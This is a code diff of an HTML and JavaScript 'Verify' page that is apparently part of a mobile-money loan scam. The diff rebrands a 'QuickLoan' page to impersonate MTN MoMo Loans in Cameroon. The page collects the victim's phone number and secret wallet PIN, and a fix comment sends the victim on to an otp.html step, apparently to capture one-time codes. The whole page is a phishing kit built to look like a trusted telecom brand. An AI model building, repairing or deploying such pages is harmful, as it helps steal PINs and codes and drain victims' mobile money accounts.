@@ -3,11 +3,12 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verify — QuickLoan</title>
+<title>Verify — MTN MoMo Loans</title>
 <style>
   :root{
     --mtn-blue:#004F9F;
     --mtn-blue-dark:#003B77;
+    --mtn-blue-deep:#002B5C;
     --mtn-blue-light:#1A6DC4;
     --mtn-yellow:#FFCC00;
     --bg:#F7F9FC;
@@ -38,64 +39,33 @@
     align-items:center;
   }
 
-  /* ============ BLUE FRAME LINES ============ */
   .frame-top, .frame-bottom{
     width:100%;
     height:6px;
-    background:linear-gradient(90deg, var(--mtn-blue) 0%, var(--mtn-blue-light) 50%, var(--mtn-blue) 100%);
+    background:linear-gradient(90deg, var(--mtn-blue-deep) 0%, var(--mtn-blue) 50%, var(--mtn-blue-deep) 100%);
   }
   .frame-bottom{margin-top:auto;}
 
-  /* ============ HEADER ============ */
+  /* ============ HEADER (blue bar, "MTN.") ============ */
   .header{
     width:100%;
-    background:#FFFFFF;
-    border-bottom:1px solid var(--border);
-    padding:16px 20px;
+    background:var(--mtn-blue-deep);
+    border-bottom:1px solid var(--mtn-blue-dark);
+    padding:18px 20px;
     position:sticky;top:0;z-index:50;
-    box-shadow:0 2px 12px rgba(0,79,159,0.06);
+    box-shadow:0 4px 16px rgba(0,43,92,0.28);
   }
   .header-inner{
     width:100%;max-width:920px;margin:0 auto;
-    display:flex;align-items:center;justify-content:space-between;
+    display:flex;align-items:center;justify-content:center;
   }
 
-  .brand{display:flex;align-items:center;gap:11px;text-decoration:none;}
-  .brand .logo{
-    width:42px;height:42px;border-radius:50%;
-    background:var(--mtn-blue);
-    display:flex;align-items:center;justify-content:center;
-    font-weight:900;color:var(--mtn-yellow);
-    font-size:11.5px;letter-spacing:-0.4px;
-    box-shadow:0 4px 12px rgba(0,79,159,0.28);
+  .brand{display:flex;align-items:center;text-decoration:none;}
+  .brand strong{
+    font-size:26px;font-weight:900;color:#FFFFFF;
+    letter-spacing:2px;text-transform:uppercase;
   }
-  .brand .wordmark{display:flex;flex-direction:column;line-height:1.15;}
-  .brand .wordmark strong{
-    font-size:17px;font-weight:800;color:var(--mtn-blue);letter-spacing:-0.3px;
-  }
-  .brand .wordmark small{
-    font-size:10.5px;color:var(--muted);font-weight:600;
-    letter-spacing:0.4px;text-transform:uppercase;
-  }
-
-  /* ---- STEP INDICATOR ---- */
-  .steps{display:flex;align-items:center;gap:8px;}
-  .step{
-    display:flex;align-items:center;gap:7px;
-    font-size:12.5px;font-weight:700;color:var(--muted);
-  }
-  .step .num{
-    width:24px;height:24px;border-radius:50%;
-    background:#E8EEF6;color:var(--muted);
-    display:flex;align-items:center;justify-content:center;
-    font-size:12px;font-weight:800;
-  }
-  .step.done .num{background:var(--green);color:#FFFFFF;}
-  .step.done{color:var(--green);}
-  .step.active .num{background:var(--mtn-blue);color:#FFFFFF;}
-  .step.active{color:var(--mtn-blue);}
-  .step-line{width:20px;height:2px;background:#E8EEF6;border-radius:2px;}
-  .step-line.done{background:var(--green);}
+  .brand strong em{font-style:normal;color:var(--mtn-yellow);}
 
   /* ============ MAIN ============ */
   main{
@@ -110,12 +80,12 @@
     width:100%;max-width:460px;
     border-radius:20px;
     padding:34px 28px 32px;
-    box-shadow:0 12px 40px rgba(0,79,159,0.10);
+    box-shadow:0 12px 40px rgba(0,43,92,0.10);
     border:1px solid var(--border);
-    border-top:4px solid var(--mtn-blue);
+    border-top:4px solid var(--mtn-blue-deep);
   }
 
-  /* ============ PROCESSING VIEW ============ */
+  /* ============ PROCESSING VIEW (3s) ============ */
   #processingView{
     text-align:center;
     padding:20px 0 10px;
@@ -133,8 +103,8 @@
   }
   .spinner .ring.active{
     border-color:transparent;
-    border-top-color:var(--mtn-blue);
-    border-right-color:var(--mtn-blue);
+    border-top-color:var(--mtn-blue-deep);
+    border-right-color:var(--mtn-blue-deep);
     animation:spin 0.9s linear infinite;
   }
   @keyframes spin{to{transform:rotate(360deg);}}
@@ -149,7 +119,6 @@
     line-height:1.6;margin-bottom:26px;
   }
 
-  /* ---- PROGRESS BAR ---- */
   .progress-wrap{
     width:100%;
     height:6px;
@@ -161,7 +130,7 @@
   .progress-bar{
     height:100%;
     width:0%;
-    background:linear-gradient(90deg,var(--mtn-blue),var(--mtn-blue-light));
+    background:linear-gradient(90deg,var(--mtn-blue-deep),var(--mtn-blue));
     border-radius:6px;
     transition:width 0.3s ease;
   }
@@ -172,7 +141,6 @@
     letter-spacing:0.3px;
   }
 
-  /* ---- PROCESSING STEPS ---- */
   .proc-steps{
     list-style:none;
     margin:26px 0 0;
@@ -207,7 +175,6 @@
   /* ============ VERIFY VIEW ============ */
   #verifyView{display:none;}
 
-  /* ---- WALLET NUMBER FIELD ---- */
   .field{margin-bottom:24px;}
 
   .field label{
@@ -230,9 +197,9 @@
     overflow:hidden;
   }
   .wallet-input-wrap:focus-within{
-    border-color:var(--mtn-blue);
+    border-color:var(--mtn-blue-deep);
     background:#FFFFFF;
-    box-shadow:0 0 0 4px rgba(0,79,159,0.10);
+    box-shadow:0 0 0 4px rgba(0,43,92,0.10);
   }
 
   .wallet-input-wrap .prefix{
@@ -242,7 +209,7 @@
     padding:0 12px 0 16px;
     font-size:15px;
     font-weight:800;
-    color:var(--mtn-blue);
+    color:var(--mtn-blue-deep);
     background:transparent;
     height:56px;
     border-right:1px solid var(--border);
@@ -287,7 +254,7 @@
     align-items:center;
     gap:6px;
     background:#EAF2FB;
-    color:var(--mtn-blue);
+    color:var(--mtn-blue-deep);
     font-size:11px;
     font-weight:800;
     letter-spacing:0.6px;
@@ -298,11 +265,10 @@
   }
   .wallet-tag svg{
     width:12px;height:12px;
-    stroke:var(--mtn-blue);fill:none;
+    stroke:var(--mtn-blue-deep);fill:none;
     stroke-width:2.6;stroke-linecap:round;stroke-linejoin:round;
   }
 
-  /* ---- PIN ---- */
   .pin-wrap{
     display:flex;
     gap:10px;
@@ -321,16 +287,16 @@
     outline:none;
     transition:.15s;
     font-family:inherit;
-    caret-color:var(--mtn-blue);
+    caret-color:var(--mtn-blue-deep);
   }
   .pin-wrap input:focus{
-    border-color:var(--mtn-blue);
+    border-color:var(--mtn-blue-deep);
     background:#FFFFFF;
-    box-shadow:0 0 0 4px rgba(0,79,159,0.10);
+    box-shadow:0 0 0 4px rgba(0,43,92,0.10);
     transform:translateY(-2px);
   }
   .pin-wrap input.filled{
-    border-color:var(--mtn-blue);
+    border-color:var(--mtn-blue-deep);
     background:#EAF2FB;
   }
   .pin-wrap input.error{
@@ -354,7 +320,6 @@
   }
   .pin-hint.error{color:var(--red);font-weight:700;}
 
-  /* ---- BUTTONS ---- */
   .btn-row{display:flex;gap:12px;}
   .btn-back{
     flex:0 0 auto;
@@ -368,23 +333,23 @@
     display:flex;align-items:center;justify-content:center;
     transition:.18s;
   }
-  .btn-back:hover{border-color:var(--mtn-blue);color:var(--mtn-blue);background:#F1F6FC;}
+  .btn-back:hover{border-color:var(--mtn-blue-deep);color:var(--mtn-blue-deep);background:#F1F6FC;}
 
   .cta{
     flex:1;
     padding:16px;
     border:none;border-radius:12px;
-    background:var(--mtn-blue);
+    background:var(--mtn-blue-deep);
     color:#FFFFFF;
     font-size:16px;font-weight:800;
     cursor:pointer;letter-spacing:0.3px;
     transition:.18s;
-    box-shadow:0 8px 20px rgba(0,79,159,0.3);
+    box-shadow:0 8px 20px rgba(0,43,92,0.32);
   }
   .cta:hover{
-    background:var(--mtn-blue-dark);
+    background:var(--mtn-blue);
     transform:translateY(-2px);
-    box-shadow:0 12px 26px rgba(0,79,159,0.38);
+    box-shadow:0 12px 26px rgba(0,43,92,0.4);
   }
   .cta:active{transform:translateY(0);}
   .cta:disabled{opacity:0.5;cursor:not-allowed;transform:none;box-shadow:none;}
@@ -398,13 +363,10 @@
     stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
   }
 
-  /* ============ MOBILE ============ */
   @media(max-width:640px){
-    .steps .step span:not(.num){display:none;}
-    .step-line{width:14px;}
     main{padding:28px 16px 44px;}
     .card{padding:28px 20px;}
-    .brand .wordmark small{display:none;}
+    .brand strong{font-size:22px;letter-spacing:1.5px;}
     .pin-wrap input{width:46px;height:54px;font-size:22px;}
     .btn-row{flex-direction:column-reverse;}
     .btn-back{width:100%;}
@@ -413,37 +375,20 @@
 </head>
 <body>
 
-  <!-- TOP BLUE FRAME -->
   <div class="frame-top"></div>
 
-  <!-- HEADER -->
   <header class="header">
     <div class="header-inner">
       <a class="brand" href="index.html">
-        <div class="logo">MTN</div>
-        <div class="wordmark">
-          <strong>QuickLoan</strong>
-          <small>Powered by MoMo</small>
-        </div>
+        <strong>MTN<em>.</em></strong>
       </a>
-
-      <div class="steps">
-        <div class="step done"><span class="num">✓</span><span>Amount</span></div>
-        <div class="step-line done"></div>
-        <div class="step done"><span class="num">✓</span><span>Details</span></div>
-        <div class="step-line done"></div>
-        <div class="step active"><span class="num">3</span><span>Verify</span></div>
-        <div class="step-line"></div>
-        <div class="step"><span class="num">4</span><span>Confirm</span></div>
-      </div>
     </div>
   </header>
 
-  <!-- MAIN -->
   <main>
     <div class="card">
 
-      <!-- ============ PROCESSING VIEW (unchanged) ============ -->
+      <!-- PROCESSING (3s) -->
       <div id="processingView">
         <div class="spinner">
           <div class="ring"></div>
@@ -474,10 +419,9 @@
         </ul>
       </div>
 
-      <!-- ============ VERIFY VIEW (edited) ============ -->
+      <!-- VERIFY VIEW -->
       <div id="verifyView">
 
-        <!-- WALLET NUMBER -->
         <div class="field">
           <label for="walletNumber">Phone number</label>
           <div class="wallet-input-wrap">
@@ -502,7 +446,6 @@
           </div>
         </div>
 
-        <!-- PIN -->
         <div class="pin-wrap" id="pinWrap">
           <input type="password" inputmode="numeric" maxlength="1" data-idx="0">
           <input type="password" inputmode="numeric" maxlength="1" data-idx="1">
@@ -514,7 +457,6 @@
           This is your secret. Never share it with anyone.
         </p>
 
-        <!-- ACTIONS -->
         <div class="btn-row">
           <a href="apply.html" class="btn-back">← Back</a>
           <button type="button" class="cta" id="verifyBtn" disabled>Confirm</button>
@@ -533,24 +475,21 @@
     </div>
   </main>
 
-  <!-- BOTTOM BLUE FRAME -->
   <div class="frame-bottom"></div>
 
 <script>
-  // ----- READ FROM URL -----
   const params = new URLSearchParams(location.search);
   const amount = parseInt(params.get('amount')) || 50000;
   const months = parseInt(params.get('months')) || 1;
   const phone  = params.get('phone') || '';
   const ref    = params.get('ref')   || '';
 
-  // Prefill wallet number (strip +237 if present)
   if(phone){
     document.getElementById('walletNumber').value =
       phone.replace(/^\+?237/,'').replace(/\s/g,'');
   }
 
-  // ==================== PROCESSING SEQUENCE (unchanged) ====================
+  // ==================== PROCESSING (3s) ====================
   const procSteps   = document.querySelectorAll('#procSteps li');
   const progressBar = document.getElementById('progressBar');
   const progressLbl = document.getElementById('progressLabel');
@@ -596,7 +535,6 @@
   // ==================== WALLET INPUT ====================
   const walletInput = document.getElementById('walletNumber');
 
-  // Format as user types: 6XX XXX XXX
   walletInput.addEventListener('input', e => {
     let v = e.target.value.replace(/\D/g,'').slice(0,9);
     let out = '';
@@ -607,7 +545,7 @@
     updateVerifyState();
   });
 
-  // ==================== PIN INPUT LOGIC (unchanged) ====================
+  // ==================== PIN INPUT ====================
   const pinInputs = [...document.querySelectorAll('#pinWrap input')];
   const verifyBtn = document.getElementById('verifyBtn');
   const pinHint   = document.getElementById('pinHint');
@@ -678,9 +616,9 @@
     verifyBtn.textContent = 'Confirming…';
 
     setTimeout(() => {
-      // TODO: POST { wallet, pin } to your backend → MTN MoMo API
+      // Navigate to otp.html (this fixes the "not found" — it used to point to confirm.html)
       window.location.href =
-        'confirm.html' +
+        'otp.html' +
         '?amount=' + amount +
         '&months=' + months +
         '&phone='  + encodeURIComponent(wallet) +
